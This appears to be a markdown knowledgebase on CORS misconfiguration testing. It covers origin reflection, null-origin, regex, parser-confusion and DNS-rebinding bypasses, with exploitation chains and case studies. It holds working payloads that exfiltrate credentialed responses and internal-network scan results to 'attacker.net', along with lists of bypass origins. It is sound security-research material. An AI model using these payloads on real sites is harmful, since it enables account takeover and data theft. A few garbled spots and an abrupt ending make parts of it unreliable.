# CORS Misconfiguration — Research-Grade Knowledgebase

> **Classification:** Web Application Security | Bug Bounty | Black-Box Testing  
> **Scope:** OWASP Top 10 (Broken Access Control), API Security, Client-Side Trust Abuse  
> **Last Updated:** 2026-05-23  
> **Sources:** PortSwigger Research, PayloadsAllTheThings, HackTricks, OWASP, Nuclei Templates, Corsy, CORScanner, Real-World Bug Bounty Writeups

---

## Table of Contents

- [Basics](#basics)
- [CORS Headers Explained](#cors-headers-explained)
- [ACAO Misconfigurations](#acao-misconfigurations)
- [Credentialed Requests Abuse](#credentialed-requests-abuse)
- [Wildcard Origin Abuse](#wildcard-origin-abuse)
- [Null Origin Exploitation](#null-origin-exploitation)
- [Trusted Origin Bypass](#trusted-origin-bypass)
- [Regex Bypass Payloads](#regex-bypass-payloads)
- [Parser Confusion Payloads](#parser-confusion-payloads)
- [CRLF Origin Injection](#crlf-origin-injection)
- [Internal Network Abuse](#internal-network-abuse)
- [Localhost Trust Abuse](#localhost-trust-abuse)
- [DNS Rebinding Chains](#dns-rebinding-chains)
- [Preflight Abuse](#preflight-abuse)
- [Browser Quirks](#browser-quirks)
- [Exploitation Chains](#exploitation-chains)
- [Real World Case Studies](#real-world-case-studies)
- [JSONP + CORS Chains](#jsonp--cors-chains)
- [XSS + CORS Chains](#xss--cors-chains)
- [SSRF + CORS Chains](#ssrf--cors-chains)
- [Subdomain Takeover Chains](#subdomain-takeover-chains)
- [Gadget Chains](#gadget-chains)
- [Origin Reflection Payloads](#origin-reflection-payloads)
- [Fuzzing Payloads](#fuzzing-payloads)
- [Automation Workflows](#automation-workflows)
- [Recon Methodology](#recon-methodology)
- [Nuclei Templates](#nuclei-templates)
- [Tools and Scanners](#tools-and-scanners)
- [Advanced Research](#advanced-research)
- [Bug Bounty Writeups](#bug-bounty-writeups)
- [Payload Collections](#payload-collections)
- [WAF Bypasses](#waf-bypasses)
- [Detection Techniques](#detection-techniques)
- [References](#references)

---

## Basics

### What is CORS?

Cross-Origin Resource Sharing (CORS) is a browser mechanism that enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the Same-Origin Policy (SOP). However, a poorly configured CORS policy provides potential for cross-domain attacks.

> **Critical Note:** CORS is **not** a protection against cross-origin attacks such as CSRF. It is a relaxation of SOP.

### Same-Origin Policy (SOP)

The Same-Origin Policy is a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain. It generally allows a domain to issue requests to other domains, but not to access the responses.

### When CORS Becomes Dangerous

CORS becomes dangerous when:
1. The server reflects arbitrary origins in `Access-Control-Allow-Origin`
2. `Access-Control-Allow-Credentials: true` is present alongside a reflected or weakly validated origin
3. The application trusts origins that are attacker-controlled (subdomains, null, localhost, HTTP origins on HTTPS sites)
4. Internal APIs expose CORS headers to external origins

### The "Two-Header Rule" for Exploitation

For a credentialed CORS attack to work, you need **both** headers:

```http
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

If only `ACAO` is reflected without `ACAC`, the browser will not send cookies, but unauthenticated data may still be exfiltrated (useful for internal network pivoting).

---

## CORS Headers Explained

### Request Headers

| Header | Description |
|--------|-------------|
| `Origin` | Indicates the origin of the cross-origin request |
| `Access-Control-Request-Method` | Used in preflight to indicate the method of the actual request |
| `Access-Control-Request-Headers` | Used in preflight to indicate headers of the actual request |

### Response Headers

| Header | Description |
|--------|-------------|
| `Access-Control-Allow-Origin` | Specifies which origin(s) can access the resource |
| `Access-Control-Allow-Credentials` | Indicates whether credentialed requests are allowed (`true` only valid value) |
| `Access-Control-Allow-Methods` | Specifies allowed HTTP methods |
| `Access-Control-Allow-Headers` | Specifies allowed request headers |
| `Access-Control-Expose-Headers` | Specifies which response headers can be exposed to the client |
| `Access-Control-Max-Age` | Specifies how long preflight results can be cached |
| `Vary: Origin` | **Critical.** Instructs caches to serve different responses based on Origin. Missing this enables cache poisoning. |

### Key Behaviors

- `Access-Control-Allow-Origin: *` cannot be used with `Access-Control-Allow-Credentials: true`. Browsers reject this combination.
- The only valid wildcard is `*`. `https://*.example.com` is **not** valid and will not work in any browser.
- Space-separated lists of origins (e.g., `http://foo.com http://bar.net`) are suggested by the spec but **not supported by any browser**.
- `Access-Control-Allow-Credentials: true` is the only valid value. Any other value (including `false`, `1`, `yes`) is treated as **not present** by browsers.

---

## ACAO Misconfigurations

### 1. Arbitrary Origin Reflection (The Classic)

The server reads the `Origin` header and reflects it back without validation.

#### Vulnerable Response

```http
GET /api/user/profile HTTP/1.1
Host: victim.com
Origin: https://evil.com
Cookie: session=abc123

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

{"email":"admin@victim.com","api_key":"sk_live_xxxx"}
```

#### Exploitation

```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://victim.com/api/user/profile',true);
req.withCredentials = true;
req.send();

function reqListener() {
    fetch('https://attacker.net/log?data='+encodeURIComponent(this.responseText));
};
</script>
```

### 2. Dynamic ACAO Generation Indicators

Strong indicators that a server dynamically generates ACAO:
- Response contains `Access-Control-Allow-Origin` but no explicit list of origins in documentation
- ACAO is only present when an `Origin` request header is sent
- ACAO matches the exact `Origin` value provided
- Missing `Vary: Origin` header on responses with dynamic ACAO

### 3. Vary: Origin Omission → Cache Poisoning

When servers dynamically generate ACAO but omit `Vary: Origin`, the response may be cached by the browser or intermediate caches. This enables:

- **Client-side cache poisoning:** Inject XSS via custom headers that get cached and rendered
- **Server-side cache poisoning:** Crafted Origin with CRLF can poison CDN/browser caches

---

## Credentialed Requests Abuse

### The `withCredentials` Flag

When `XMLHttpRequest.withCredentials = true` is set:
- Cookies, HTTP Basic/Digest auth, and client-side TLS certs are sent
- The browser requires an exact (not wildcard) ACAO match
- `Access-Control-Allow-Credentials: true` must be present

### Attack Requirements

```
Attacker Controls          Victim Browser          Target Server
     |                           |                        |
     |-- evil.com -------------->|                        |
     |                           |-- CORS Request ------->|
     |                           |   Origin: evil.com    |
     |                           |   Cookie: session=... |
     |                           |<-- ACAO: evil.com ----|
     |                           |   ACAC: true          |
     |<-- Exfiltrated Data ------|                        |
```

### Impact Escalation

With credentialed CORS, an attacker can:
1. Read private API responses (API keys, PII, CSRF tokens)
2. Perform account takeover (disable 2FA, change email, transfer funds)
3. Access internal/admin endpoints if the victim has elevated privileges
4. Pivot from XSS on a trusted origin to steal data from the main domain

---

## Wildcard Origin Abuse

### The Wildcard + Credentials Myth

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

**Browser Behavior:** This combination is **rejected by all modern browsers**. The browser will not send cookies and will block the response.

> Error in console: `Cannot use wildcard in Access-Control-Allow-Origin when credentials flag is true.`

### When Wildcard is Still Dangerous

Wildcard (`ACAO: *`) without credentials is dangerous in these scenarios:

#### 1. Internal Network Pivoting

```http
GET /internal/api/status HTTP/1.1
Host: intranet.victim.com
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

{"internal_ip":"10.0.0.5","services":["jenkins","gitlab"]}
```

An external attacker can use the victim's browser as a proxy to scan internal services:

```javascript
// Scan internal IPs via victim's browser
for (let i = 1; i <= 254; i++) {
    let req = new XMLHttpRequest();
    req.open('GET', `http://10.0.0.${i}:8080/api/info`, true);
    req.onload = function() {
        if (this.status === 200) {
            fetch(`https://attacker.net/log?ip=10.0.0.${i}&data=`+btoa(this.responseText));
        }
    };
    req.send();
}
```

#### 2. Unauthenticated API Endpoints

Public APIs that don't require auth but contain sensitive data:
- Pricing data, inventory levels, user counts
- Configuration endpoints (`/config`, `/api/v1/settings`)
- Internal documentation (`/swagger.json`, `/api/docs`)

---

## Null Origin Exploitation

### What is the Null Origin?

Browsers send `Origin: null` in these situations:
- Cross-origin redirects
- Requests from serialized data (iframes with `sandbox`)
- Requests using the `file://` protocol
- Sandboxed cross-origin requests
- Data URI documents
- `iframe` with `sandbox` attribute

### Why Developers Whitelist Null

Developers often whitelist `null` to support:
- Local development (`file://` testing)
- Cordova/PhoneGap mobile apps
- Electron applications
- Legacy iframe integrations

### The Sandbox Iframe Trick

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" 
        src="data:text/html,<script>
  var req = new XMLHttpRequest();
  req.onload = function() {
    location='https://attacker.net/log?key='+encodeURIComponent(this.responseText);
  };
  req.open('get','https://victim.com/api/private',true);
  req.withCredentials = true;
  req.send();
</script>"></iframe>
```

**Key attributes:**
- `sandbox="allow-scripts allow-top-navigation allow-forms"` — required for the iframe to execute scripts and navigate
- `src="data:text/html,..."` — forces `Origin: null` in the resulting request
- The victim's browser sends cookies because `withCredentials = true`

### Null Origin in Bug Bounties

Real-world targets found with null origin whitelisting:
- Google Docs PDF viewer (`docs.google.com`)
- Multiple cryptocurrency exchanges (wallet backups, API keys)
- Financial services internal APIs

### Advanced Null Origin Gadgets

#### Using `about:blank` with `document.write`

```javascript
// Open about:blank (null origin) and inject CORS payload
let win = window.open('about:blank');
win.document.write(`
  <script>
    var req = new XMLHttpRequest();
    req.open('GET','https://victim.com/api/user',true);
    req.withCredentials = true;
    req.onload = function() {
        fetch('https://attacker.net/log?d='+btoa(this.responseText));
    };
    req.send();
  <\/script>
`);
```

#### Using `javascript:` URI Redirects

```html
<!-- Force null origin via javascript: pseudo-protocol -->
<iframe src="javascript:'<script>var req=new XMLHttpRequest();req.open(...)'">
```

---

## Trusted Origin Bypass

### Prefix/Postfix Injection

When a server checks if the origin "starts with" or "ends with" a trusted domain:

#### Prefix Trust (Starts With)

```
Trusted: https://victim.com
Bypass:  https://victim.com.evil.com
Bypass:  https://victim.com-attacker.com
Bypass:  https://victim.com.attacker.net
```

#### Postfix Trust (Ends With)

```
Trusted: victim.com
Bypass:  evilvictim.com
Bypass:  notvictim.com
Bypass:  attacker-victim.com
```

#### Subdomain Injection

```
Trusted: https://*.victim.com
Bypass:  https://evil.victim.com.attacker.com
Bypass:  https://victim.com.evil.com
```

### Protocol Bypass (HTTP on HTTPS Site)

If a site uses HTTPS but trusts HTTP origins:

```
Trusted: http://subdomain.victim.com
```

An active MITM attacker can:
1. Intercept victim's HTTP traffic
2. Inject a redirect to `http://subdomain.victim.com`
3. Serve a malicious page from that origin
4. The browser makes a CORS request with `Origin: http://subdomain.victim.com`
5. The HTTPS site reflects this origin and returns data with cookies

**Impact:** This bypasses HSTS, Secure cookies, and mixed-content protections. The attacker doesn't need to break TLS — they just need to downgrade a single HTTP request.

### Third-Party Subdomain Takeover → CORS Trust

If `victim.com` trusts `cdn.victim.com` and `cdn.victim.com` is a CNAME to a cloud provider that has been deleted:

1. Attacker claims `cdn.victim.com` on the cloud provider
2. Attacker serves CORS exploitation code
3. Browser sends `Origin: https://cdn.victim.com`
4. Main site reflects this origin and returns sensitive data

---

## Regex Bypass Payloads

### Unescaped Dot (`.`) in Regex

```python
# Vulnerable regex
^api\.example\.com$

# If the dot is NOT escaped:
^api.example.com$
```

**Bypass:** `https://apiiexample.com` (dot matches any character)

```
Origin: https://apiiexample.com
Server reflects: https://apiiexample.com
```

### Missing Anchors (`^` and `$`)

```python
# Vulnerable (no anchors)
api.example.com
```

**Bypasses:**
```
https://evil-api.example.com
https://api.example.com.evil.com
https://notapi.example.com
```

### Overly Permissive Regex Patterns

```python
# Vulnerable patterns
.*\.example\.com        # Matches evil.example.com.attacker.com
.*example\.com$         # Matches notexample.com
^https?://.*example\.com  # Matches https://evil-example.com
```

### Subdomain Wildcard Regex Bypass

```python
# Vulnerable: trusts any subdomain of example.com
^(.*)\.example\.com$
```

**Bypass:** Register `evil.example.com` (legitimate subdomain) or use:
```
https://evil.example.com.evil.com
```

If the regex doesn't properly validate the full hostname structure.

---

## Parser Confusion Payloads

### Backtick Injection (Safari)

Discovered by Bitwis3 / James Kettle. Safari tolerates backticks in domain names.

```
URL: http://example.com%60.hackxor.net/static/cors.html
```

When Safari navigates to this URL, the Origin header becomes:
```
Origin: http://example.com`.hackxor.net
```

If the server parses this as a URL and extracts the hostname, it sees `example.com` and reflects it.

**PoC for Safari:**
```html
<script>
// Host this at a domain you control with backtick-encoded URL
location.href = "http://victim.com%60.attacker.com/exploit.html";
</script>
```

### Underscore Injection (Firefox/Chrome)

Firefox and Chrome allow underscores in domain names (though not at the start/end in some contexts).

```
Origin: https://victim_com.attacker.com
```

If the parser splits on underscore incorrectly:
```python
origin.split('_')[0]  # Returns "victim" — wrong!
```

### URL-Encoding Confusion

```
Origin: https://victim%2ecom.attacker.com
Origin: https://victim%00.com.attacker.com
Origin: https://victim.com%2f.attacker.com
```

If the server URL-decodes the Origin before validation but the browser sends it encoded, the server may parse `victim.com` from the encoded string.

### Unicode/IDN Homograph Attacks

```
Origin: https://vіctim.com  (using Cyrillic 'і' U+0456)
Origin: https://νictim.com  (using Greek 'ν' U+03BD)
```

If the server normalizes Unicode before validation but the browser punycode-encodes it, the server may see `victim.com` in its normalized form.

### Port Confusion

```
Origin: https://victim.com:80.evil.com
Origin: https://victim.com.evil.com:443
```

Some parsers strip the port but fail to properly validate the hostname structure, accepting `victim.com.evil.com` because it contains `victim.com`.

---

## CRLF Origin Injection

### HTTP Response Splitting via Origin Header

If the application reflects the Origin header without sanitizing CRLF (`%0D%0A`), this enables HTTP Response Splitting / Header Injection.

**Internet Explorer / Edge Legacy Behavior:**
IE and legacy Edge treat `` (`0x0d`) as a valid HTTP header terminator.

```http
GET / HTTP/1.1
Origin: z%0d%0aContent-Type: text/html; charset=UTF-7
```

The server reflects:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```

**Note:** You cannot make a victim's browser send a malformed Origin header directly. This is primarily useful for:
- Server-side cache poisoning (manually crafted request poisons CDN cache)
- Testing for header injection vulnerabilities
- Combined with request smuggling for stored XSS

### Cache Poisoning Chain

```
1. Attacker sends: Origin: evil.com%0d%0aLocation: https://evil.com
2. Server reflects Origin with CRLF, injecting Location header
3. Cache stores the poisoned response
4. All users hitting the cached URL are redirected to evil.com
```

---

## Internal Network Abuse

### Intranet CORS without Credentials

Internal APIs often use:
```http
Access-Control-Allow-Origin: *
```

Without credentials, this seems safe. However:

1. The attacker cannot access `http://intranet.victim.com` directly (private IP)
2. The victim's browser **can** access it (same network)
3. The attacker hosts a page on the internet that makes CORS requests to internal IPs
4. The browser sends the request (no credentials needed for unauthenticated internal APIs)
5. The response is exfiltrated back to the attacker

### Internal IP Scanning via CORS

```javascript
// Scan RFC1918 space via victim browser
const subnets = ['192.168.1', '10.0.0', '172.16.0'];
const ports = [80, 8080, 8443, 3000, 5000, 8000];

subnets.forEach(subnet => {
    for (let i = 1; i <= 254; i++) {
        ports.forEach(port => {
            let req = new XMLHttpRequest();
            req.timeout = 3000;
            req.open('GET', `http://${subnet}.${i}:${port}/api/info`, true);
            req.onload = function() {
                if (this.status === 200) {
                    exfil(`${subnet}.${i}:${port}`, this.responseText);
                }
            };
            req.onerror = function() {
                // Port closed or CORS blocked
            };
            req.send();
        });
    }
});
```

### Exploiting Internal Services

Common internal targets:
- Jenkins (`/api/json`, `/script`, `/asynchPeople/api/json`)
- GitLab (`/api/v4/projects`, `/api/v4/user`)
- Kubernetes Dashboard (`/api/v1/namespaces`)
- ElasticSearch (`/_cat/indices`, `/_cluster/health`)
- Consul (`/v1/catalog/services`)
- Docker Registry (`/v2/_catalog`)
- Prometheus (`/api/v1/targets`)

---

## Localhost Trust Abuse

### Why Localhost is Dangerous

Applications frequently whitelist `localhost` or `127.0.0.1` for:
- Desktop applications with embedded web servers
- Development tools (React dev server, webpack-dev-server)
- OAuth callbacks during local development
- Electron / NW.js applications

### Localhost Bypass Techniques

#### 1. Direct Localhost Reflection

```http
Origin: http://localhost:3000
Server reflects: http://localhost:3000
```

Any user running a local server on port 3000 can be exploited by visiting an attacker page that makes CORS requests to `https://victim.com` with `Origin: http://localhost:3000`.

#### 2. localhost Subdomains

```
Origin: http://evil.localhost:3000
Origin: http://localhost.attacker.com
```

Some parsers see `localhost` anywhere in the string and approve it.

#### 3. DNS Rebinding to 127.0.0.1

Attacker controls `rebind.attacker.com` with TTL=0. First response resolves to attacker IP, second resolves to `127.0.0.1`.

```javascript
// Phase 1: Load from attacker IP, establish CORS trust
// Phase 2: Rebind to 127.0.0.1, make credentialed request to localhost service
```

### Exploiting Local Development Servers

Many developers run APIs locally that mirror production:
```
http://localhost:8080/api/internal/users
http://127.0.0.1:3000/admin/config
```

If production trusts localhost, an attacker can:
1. Trick a developer into visiting evil.com
2. evil.com makes CORS request to production with `Origin: http://localhost:8080`
3. Production reflects the origin and returns data with the developer's session cookies
4. Data is exfiltrated to evil.com

---

## DNS Rebinding Chains

### DNS Rebinding + CORS Architecture

```
Phase 1 (Initial Load):
  Browser -> attacker.com (resolves to 1.2.3.4)
  Attacker serves malicious HTML/JS

Phase 2 (Rebind):
  Browser caches DNS for attacker.com (TTL=0 or cache flush)
  Second request: attacker.com now resolves to 127.0.0.1 or 10.0.0.5

Phase 3 (Exploitation):
  JS from attacker.com (now same-origin to internal IP) makes requests
  OR
  JS makes CORS request with Origin: http://attacker.com to internal service
  Internal service trusts attacker.com (if misconfigured)
```

### CORS-Specific DNS Rebinding

If the target internal service has:
```http
Access-Control-Allow-Origin: http://attacker.com
Access-Control-Allow-Credentials: true
```

After DNS rebind:
1. Browser thinks `attacker.com` = `127.0.0.1`
2. Request goes to localhost service
3. Service sees `Origin: http://attacker.com` and approves (from its perspective, the request came from the internet origin)
4. Browser allows reading the response because the "origin" matches

### Tools for DNS Rebinding

- `singularity` (Google Project Zero)
- `rbndr` (rapid DNS rebinding)
- `whonow` (custom DNS rebinding)
- `of-cors` (exploit CORS on internal networks)

---

## Preflight Abuse

### What is Preflight?

For "non-simple" requests (PUT, DELETE, custom headers, Content-Type other than `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`), the browser sends an `OPTIONS` preflight request.

```http
OPTIONS /api/user HTTP/1.1
Host: victim.com
Origin: https://evil.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: X-Custom-Header

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: X-Custom-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
```

### Preflight Bypass Scenarios

#### 1. Preflight Caching Abuse (`Max-Age`)

If the server responds with a long `Access-Control-Max-Age`, the browser caches the preflight result. An attacker can:
1. Pre-flight from evil.com (gets approved)
2. Cache is stored for `Max-Age` seconds
3. Even if the server fixes the CORS config, cached preflight allows requests until expiry

#### 2. Method Override via Simple Request

Instead of sending a preflight-triggering PUT with JSON, use a simple GET/POST that the server interprets as the privileged action:

```javascript
// Some APIs accept _method=PUT via GET
fetch('https://victim.com/api/user?_method=PUT&email=attacker@evil.com', {
    credentials: 'include'
});
```

#### 3. Header Injection via Simple Content-Type

Use `Content-Type: text/plain` to avoid preflight, but the server parses the body as JSON:

```javascript
fetch('https://victim.com/api/user', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'text/plain'},
    body: '{"action":"delete_account"}'
});
```

#### 4. Preflight Response Without Actual Check

Some servers respond to `OPTIONS` with permissive headers but don't enforce the same policy on the actual `GET/POST/PUT` request. Always verify both preflight and actual request responses.

---

## Browser Quirks

### Origin Header Behavior by Browser

| Scenario | Chrome | Firefox | Safari | Edge |
|----------|--------|---------|--------|------|
| `file://` request | `null` | `null` | `null` | `null` |
| Sandboxed iframe | `null` | `null` | `null` | `null` |
| Redirect cross-origin | `null` | `null` | `null` | `null` |
| Backtick in URL | Rejects | Rejects | **Accepts** | Rejects |
| Underscore in domain | Accepts | Accepts | Accepts | Accepts |
| `data:` URI | `null` | `null` | `null` | `null` |
| `about:blank` | `null` | `null` | `null` | `null` |
| `javascript:` URI | `null` | `null` | `null` | `null` |

### Safari-Specific Quirks

- Safari allows backticks (`` ` ``) in hostnames, enabling parser confusion attacks
- Safari's URL parser is more lenient with unusual characters in the authority section
- Safari sends `Origin: null` for more redirect scenarios than other browsers

### Chrome-Specific Behaviors

- Chrome blocks wildcard + credentials combination strictly
- Chrome enforces `Vary: Origin` more aggressively in cache logic
- Chrome's CORB (Cross-Origin Read Blocking) may interfere with some CORS exfiltration

### Firefox Behaviors

- Firefox allows underscores in domain names more liberally
- Firefox's `about:blank` origin handling can be exploited via `document.write` after `window.open`

### Internet Explorer / Legacy Edge

- IE treats `` (`%0D`) as a valid HTTP header terminator (CRLF injection)
- IE has different handling of `Access-Control-Allow-Headers` case sensitivity
- IE does not support all modern CORS features; some bypasses may work uniquely

---

## Exploitation Chains

### Chain 1: Basic Origin Reflection → API Key Theft

```
1. Discover endpoint: GET /api/requestApiKey
2. Send Origin: https://evil.com
3. Observe reflection: ACAO: https://evil.com + ACAC: true
4. Host PoC on evil.com
5. Victim visits evil.com → browser sends cookies → receives API key
6. Attacker uses API key to disable 2FA, transfer funds, exfiltrate data
```

### Chain 2: Null Origin → Wallet Backup Theft

```
1. Target: Crypto exchange with ACAC + null whitelist
2. Create sandboxed iframe with data: URI
3. iframe makes CORS request to /api/wallet/backup
4. Response contains encrypted wallet backup
5. Offline brute-force the wallet password
6. Steal cryptocurrency
```

### Chain 3: XSS on Trusted Subdomain → Main Domain Data Theft

```
1. victim.com trusts *.victim.com
2. Find XSS on blog.victim.com (outdated WordPress)
3. Inject CORS payload in XSS: XMLHttpRequest to victim.com/api/admin
4. Browser sends cookies for victim.com (not blog.victim.com)
5. victim.com sees Origin: https://blog.victim.com and approves
6. XSS exfiltrates admin data to attacker server
```

### Chain 4: HTTP Origin on HTTPS Site → MITM CORS Theft

```
1. victim.com (HTTPS) trusts http://cdn.victim.com
2. Attacker performs MITM on victim's HTTP traffic
3. Inject redirect to http://cdn.victim.com (attacker-controlled)
4. Malicious page on http://cdn.victim.com makes CORS request to https://victim.com
5. victim.com reflects http://cdn.victim.com and sends response with cookies
6. Attacker reads response (MITM is not breaking TLS, just exploiting HTTP trust)
```

### Chain 5: Internal API + Wildcard → Network Recon

```
1. Find internal API at http://192.168.1.10:8080/api/
2. Observe ACAO: * (no credentials needed)
3. Host scanner page on evil.com
4. Victim (corporate VPN) visits evil.com
5. Browser scans internal subnet via CORS
6. Exfiltrate service versions, open ports, API schemas
```

### Chain 6: CRLF + Cache Poisoning → Stored XSS

```
1. Origin header reflected without CRLF sanitization
2. Attacker sends: Origin: evil.com%0d%0aX-Custom: <svg/onload=alert(1)>
3. Server reflects: ACAO: evil.com + injected headers
4. CDN/Cache stores poisoned response
5. All users receive XSS payload when visiting the URL
```

---

## Real World Case Studies

### Case Study 1: Bitcoin Exchange API Key Theft (James Kettle, 2016)

**Target:** Unnamed Bitcoin Exchange  
**Vulnerability:** Arbitrary Origin Reflection + ACAC  
**Endpoint:** `GET /api/requestApiKey`  
**Impact:** Full account takeover, bitcoin theft

```http
GET /api/requestApiKey HTTP/1.1
Host: [redacted]
Origin: https://fiddle.jshell.net
Cookie: sessionid=...

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://fiddle.jshell.net
Access-Control-Allow-Credentials: true

{"api_key":"sk_live_..."}
```

**Exploitation:** Hosted PoC on jsfiddle.net (a trusted origin in some contexts, but here the server reflected ANY origin). Attacker could disable notifications, enable 2FA to lock victim out, and transfer bitcoins.

### Case Study 2: Google Docs PDF Viewer — Null Origin

**Target:** `docs.google.com` PDF reader  
**Vulnerability:** Whitelisted `null` origin with credentials

```http
GET /reader?url=zxcvbn.pdf HTTP/1.1
Host: docs.google.com
Origin: null

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

**Exploitation:** Sandboxed iframe with `data:` URI could exploit this to access Google Docs data with the victim's Google session.

### Case Study 3: advisor.com — Postfix Domain Trust

**Vulnerability:** Server trusted all origins ending in `advisor.com`

```
Trusted pattern: *advisor.com
Bypass: definitelynotadvisor.com
```

Attacker registered `definitelynotadvisor.com` and received reflected ACAO with credentials.

### Case Study 4: btc.net — Prefix Domain Trust

**Vulnerability:** Server trusted all origins starting with `https://btc.net`

```
Trusted pattern: https://btc.net*
Bypass: https://btc.net.evil.net
```

Attacker could register `btc.net.evil.net` and exploit the CORS trust.

### Case Study 5: Zomato CORS Misconfiguration

**Researcher:** James Kettle (albinowax)  
**Date:** September 2016  
**Finding:** CORS misconfiguration on `www.zomato.com` leading to information disclosure.

### Case Study 6: Client-Side Cache Poisoning via CORS + XSS

**Researcher:** James Kettle  
**Technique:** Custom header reflection + CORS + Missing `Vary: Origin`

```http
GET / HTTP/1.1
Host: example.com
X-User-id: <svg/onload=alert(1)>

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: X-User-id
Content-Type: text/html

Invalid user: <svg/onload=alert(1)>
```

Without CORS, the XSS in the custom header is unexploitable cross-origin. With CORS but without `Vary: Origin`, the response is cached and served to users navigating to the URL directly.

---

## JSONP + CORS Chains

### JSONP Endpoint as CORS Bypass

If a site has a JSONP endpoint but not CORS, you can sometimes combine them:

```javascript
// Step 1: Use JSONP to execute code in target origin context
// Step 2: From that context, make same-origin requests (no CORS needed)
// Step 3: Exfiltrate data via CORS to attacker.com (if attacker.com has ACAO)
```

### CORS to JSONP Bridge

If a site has strict CORS but loose JSONP:
1. Use CORS to read a page that contains a JSONP callback parameter
2. Inject callback to `attacker.com/log?data=` to exfiltrate

```html
<script src="https://victim.com/api/data?callback=fetch('https://attacker.net/log?d='+document.body.innerText)"></script>
```

---

## XSS + CORS Chains

### XSS on Trusted Origin → CORS Theft

Even "correctly" configured CORS establishes a trust relationship. If a trusted origin has XSS, the CORS trust is broken.

```
victim.com trusts: https://subdomain.victim.com
subdomain.victim.com has: XSS via outdated CMS

Exploit:
https://subdomain.victim.com/?xss=<script>
  var req = new XMLHttpRequest();
  req.open('GET','https://victim.com/api/admin/users',true);
  req.withCredentials = true;
  req.onload = function() {
    fetch('https://attacker.net/log?d='+btoa(this.responseText));
  };
  req.send();
</script>
```

### Self-XSS + CORS (Stored XSS via CORS)

If a site reflects the Origin header in the response body:

```http
GET /api/echo?origin=https://evil.com HTTP/1.1

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

{"message":"Origin https://evil.com is not trusted"}
```

If `evil.com` contains XSS payload, and the response is rendered in a way that executes it, you have a stored XSS vector.

---

## SSRF + CORS Chains

### Using CORS to Confirm SSRF

If an application has SSRF but you can't see the response, use CORS as a side-channel:

```
1. Application makes server-side request to internal IP
2. The internal service responds with ACAO: * or reflects origin
3. Attacker makes CORS request to the application's SSRF endpoint
4. If CORS succeeds, the internal service responded → SSRF confirmed
```

### CORS as SSRF Response Exfiltration

If an application proxies requests and adds CORS headers:

```http
GET /proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: victim.com
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

{EC2 metadata}
```

The proxy reflects the attacker's origin, allowing the attacker to read cloud metadata.

---

## Subdomain Takeover Chains

### CORS Trust + Subdomain Takeover = Data Theft

```
1. victim.com has CORS policy: Access-Control-Allow-Origin: https://*.victim.com
2. Attacker discovers: cdn.victim.com CNAME → s3.amazonaws.com (bucket deleted)
3. Attacker claims cdn.victim.com on S3
4. Attacker hosts CORS exploit on https://cdn.victim.com
5. Victim visits attacker page on cdn.victim.com
6. Request to victim.com/main_api has Origin: https://cdn.victim.com
7. victim.com reflects origin (matches *.victim.com)
8. Attacker reads victim's data with their cookies
```

### Detecting Takeover-CORS Chains

```bash
# Find subdomains with CORS trust
subfinder -d victim.com | httpx -headers -match-string "Access-Control-Allow-Origin"

# Check for dangling CNAMEs
# If a subdomain is trusted by CORS and has a dangling CNAME, it's a high-value target
```

---

## Gadget Chains

### Gadget 1: PostMessage + CORS

If a site uses `postMessage` to communicate with an iframe and also has CORS:
1. Attacker iframe sends `postMessage` to parent to trigger a CORS request
2. Parent (victim.com) makes the CORS request with cookies
3. Response is sent back via `postMessage` to attacker iframe

### Gadget 2: WebSocket + CORS

WebSocket handshake uses Origin header. If the server also has CORS misconfigurations:
1. Attacker opens WebSocket with spoofed Origin
2. Server accepts WebSocket connection based on Origin
3. Attacker uses WebSocket to make internal API calls that also use CORS

### Gadget 3: Service Worker + CORS

```javascript
// Attacker-controlled service worker intercepts fetch
self.addEventListener('fetch', event => {
    if (event.request.url.includes('victim.com')) {
        // Modify request to include attacker's origin
        // Or cache CORS responses for later exfiltration
    }
});
```

### Gadget 4: PDF Upload + CORS

Upload a PDF with embedded JavaScript that makes CORS requests:

```javascript
// Inside malicious PDF
app.launchURL('javascript:var req=new XMLHttpRequest();req.open("GET","https://victim.com/api/keys",true);req.withCredentials=true;req.onload=function(){fetch("https://attacker.net/log?d="+this.responseText);};req.send();', true);
```

If the PDF viewer renders the PDF in the context of the site (with site's cookies), CORS can be exploited.

---

## Origin Reflection Payloads

### Basic Reflection Test

```http
GET /api/user HTTP/1.1
Host: victim.com
Origin: https://evil.com

# Expected vulnerable response:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

### Reflection Variations to Test

```http
Origin: https://evil.com
Origin: http://evil.com
Origin: https://evil.com:443
Origin: https://evil.com:80
Origin: null
Origin: https://evil.victim.com
Origin: https://victim.com.evil.com
Origin: https://evilvictim.com
Origin: https://evil.com%00
Origin: https://evil.com?
Origin: https://evil.com#
Origin: https://evil.com/
Origin: https://evil.com/subpath
Origin: https://sub.evil.com
Origin: https://evil.com:8080
Origin: http://localhost
Origin: http://127.0.0.1
Origin: http://0.0.0.0
Origin: http://[::1]
Origin: file://
Origin: https://victim.com%60.evil.com
